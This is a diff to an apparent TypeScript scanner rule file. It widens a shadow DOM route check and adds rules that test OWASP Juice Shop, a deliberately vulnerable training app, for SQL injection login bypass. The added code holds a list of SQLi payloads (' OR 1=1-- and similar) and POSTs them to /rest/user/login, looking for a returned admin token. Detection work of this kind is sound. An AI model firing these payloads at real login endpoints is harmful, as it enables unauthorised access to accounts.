@@ -31717,7 +31717,7 @@ const theInternetRedirectRouteLiveOracle: Rule = async (ctx) => {
 const theInternetShadowdomRouteLiveOracle: Rule = async (ctx) => {
   if (!isTheInternetHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
-  if (!/\/shadowdom(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  if (!/\/shadow_?dom(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
   const shadowUrl = new URL("/shadowdom", ctx.origin).toString();
   const doc = await ctx.probe.get(shadowUrl, { maxBytes: 8192, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
@@ -31734,7 +31734,7 @@ const theInternetShadowdomRouteLiveOracle: Rule = async (ctx) => {
       shadowUrl,
       markers: ["customElements.define", "attachShadow({mode:'open'})", "slot=my-text"],
       snippet: doc.body.match(/customElements\.define[\s\S]{0,120}/i)?.[0]?.slice(0, 100),
-      note: "the-internet /shadowdom route scan — custom element with open shadow root and slotted template content — Elemental Selenium shadow DOM training oracle"
+      note: "the-internet /shadowdom (or /shadow_dom alias) route scan — custom element with open shadow root and slotted template content — Elemental Selenium shadow DOM training oracle"
     }
   };
 };
@@ -38677,6 +38677,59 @@ const juiceShopPrivacyRequestsBolaRouteLiveOracle: Rule = async (ctx) => {
       ...result.evidence,
       scannedUrl: pageUrl,
       note: "Juice Shop /api/PrivacyRequests route scan — authenticated user reads another user's privacy request — route-specific BOLA oracle"
+    }
+  };
+};
+
+const JUICE_SHOP_LOGIN_SQLI_PAYLOADS = ["' OR 1=1--", "' OR '1'='1'--", "admin@juice-sh.op'--"];
+
+const juiceShopLoginSqliLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const url = new URL("/rest/user/login", ctx.origin).toString();
+  for (const email of JUICE_SHOP_LOGIN_SQLI_PAYLOADS) {
+    const doc = await ctx.probe.get(url, {
+      method: "POST",
+      body: JSON.stringify({ email, password: "x" }),
+      headers: { "Content-Type": "application/json", Accept: "application/json" },
+      maxBytes: 4096,
+      timeoutMs: 20000
+    });
+    if (doc.status < 200 || doc.status >= 300) continue;
+    if (!/"authentication"\s*:\s*\{/.test(doc.body) || !/"token"\s*:\s*"/.test(doc.body)) continue;
+    const adminHit =
+      /admin@juice-sh\.op/i.test(doc.body) || /"role"\s*:\s*"admin"/i.test(doc.body);
+    return {
+      fired: true,
+      confidence: adminHit ? 0.93 : 0.91,
+      evidence: {
+        url,
+        payload: email.slice(0, 40),
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "Juice Shop POST /rest/user/login accepts SQLi email payload and returns authentication JWT — SQL injection login bypass oracle"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+function isJuiceShopLoginContext(ctx: RuleContext): boolean {
+  const corpus = `${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}\n${ctx.combined}`;
+  return JUICE_SHOP_HOST_RE.test(corpus) && /\/rest\/user\/login(?:\/|$|\?)/i.test(corpus);
+}
+
+const juiceShopLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!isJuiceShopLoginContext(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const result = await juiceShopLoginSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /rest/user/login route scan — POST SQLi email bypass returns admin authentication JWT — route-specific SQL injection login oracle"
     }
   };
 };
@@ -47572,6 +47625,8 @@ export const RULES: Record<string, Rule> = {
   sstiVulnlabSandboxedLiveOracle,
   sstiVulnlabSandboxedRouteLiveOracle,
   juiceShopJwtAlgNoneLiveOracle,
+  juiceShopLoginSqliLiveOracle,
+  juiceShopLoginRouteLiveOracle,
   juiceShopChatbotApiLiveOracle,
   juiceShopChatbotRouteLiveOracle,
   juiceShopUsersIdorLiveOracle,
